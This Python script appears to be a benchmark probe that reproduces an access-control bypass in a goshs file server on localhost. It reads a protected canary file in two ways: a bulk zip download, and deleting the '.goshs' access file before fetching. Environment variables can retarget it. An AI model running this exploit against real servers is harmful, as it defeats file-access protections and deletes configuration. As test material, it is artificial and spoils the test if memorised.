#!/usr/bin/env python3
"""Method-side executable probe: run a candidate dict against the target.
Usage: python3 seed_exec.py <candidate.json> [version]
"""
import sys, json, urllib.request, urllib.parse, time, subprocess
BASE = {"v0": 55130, "v1": 55131}
import argparse
import http.client
import io
import json
import os
import subprocess
import sys
import time
import urllib.request
import zipfile
from pathlib import Path
BASE = {"v0": 55130, "v1": 55131}
def run_probe(candidate, *, version="v1"):
    port = BASE[version]
    kind = candidate.get("kind")
    if kind == "bulk":
        r = _get(port, "/?bulk&file=/protected/canary.txt")
        return {"status": r["status"], "body": _zip_text(r["body"])}
    
    _get(port, "/protected/.goshs?delete")
    r = _get(port, "/protected/canary.txt")
    return {"status": r["status"], "body": r["body"].decode("utf-8", "replace")}
def _get(port, path):
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}{path}", timeout=10) as r:
            return {"status": r.status, "body": r.read()}
    except Exception as e:
        return {"status": getattr(e, "code", None), "body": b""}
def _zip_text(blob: bytes) -> str:
    try:
        zf = zipfile.ZipFile(io.BytesIO(blob))
        return "\n".join(zf.read(n).decode("utf-8", "replace") for n in zf.namelist())
    except Exception:
        return blob.decode("utf-8", "replace")[:500]


import os as _os_pcb
_pbt = _os_pcb.environ.get("PCB_TARGET_BASE")
if _pbt:
    for _d in ("BASE", "HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                globals()[_d][_v] = _pbt
_pt = _os_pcb.environ.get("PCB_TARGET_PORT")
if _pt:
    if "BASE" in globals() and isinstance(globals()["BASE"], dict):
        for _v in list(globals()["BASE"]):
            _val = globals()["BASE"][_v]
            if isinstance(_val, (tuple, list)):
                globals()["BASE"][_v] = (str(_val[0]), int(_pt))
            elif isinstance(_val, int) or (isinstance(_val, str) and _val.isdigit()):
                globals()["BASE"][_v] = int(_pt)
            else:
                globals()["BASE"][_v] = f"http://127.0.0.1:{int(_pt)}"
    for _d in ("HOSTPORT", "PORTS"):
        if _d in globals() and isinstance(globals()[_d], dict):
            for _v in list(globals()[_d]):
                _old = globals()[_d][_v]
                if isinstance(_old, (tuple, list)):
                    globals()[_d][_v] = (str(_old[0]), int(_pt))
                else:
                    globals()[_d][_v] = int(_pt)

if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    r = run_probe(cand, version=version)
    print(json.dumps(r, default=str))